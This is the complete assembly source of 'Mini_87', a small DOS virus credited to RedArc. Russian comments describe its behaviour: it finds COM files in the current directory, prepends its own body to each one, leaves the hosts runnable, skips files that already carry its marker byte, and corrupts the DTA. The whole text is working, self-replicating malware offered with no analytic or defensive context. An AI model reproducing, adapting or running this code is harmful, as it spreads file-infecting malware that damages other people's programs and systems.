; Mini_87 (c) by RedArc

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ оставляет программы работоспособными
;■ не заражает повторно уже инфицированные программы
;■ портит DTA
;■ не резидентный

Model Tiny
.code
org 100h
start:
       xchg dx,ax
       inc ah
       mov es,ax
       xchg cx,si
       mov si,bx
       mov di,bx
       rep movsb
       push es
       push di
       mov ax,virlength+100h
       xchg si,ax
       push cs
       pop cx
       rep movsb
       mov dx,(virlength-6)+100h
       mov ah,4eh
@0:
       int 21h
       jnb @1
       retf
@1:
       mov ax,3d02h
       cwd
       mov dl,9eh
       int 21h
       xchg bx,ax
       mov ah,3fh
       mov dx,virlength+100h
       push sp
       pop cx
       int 21h
       cmp byte ptr ds:[virlength+100h],092h
       je @2
       add ax,virlength
       push ax
       xor cx,cx
       mul cx
       mov ah,42h
       int 21h
       pop cx
       mov ah,40h
       pop dx
       push dx
       int 21h
@2:
       mov ah,4fh
       jmp short @0
filename db '*.com', 0h
virlength equ $-start
       ret
end start
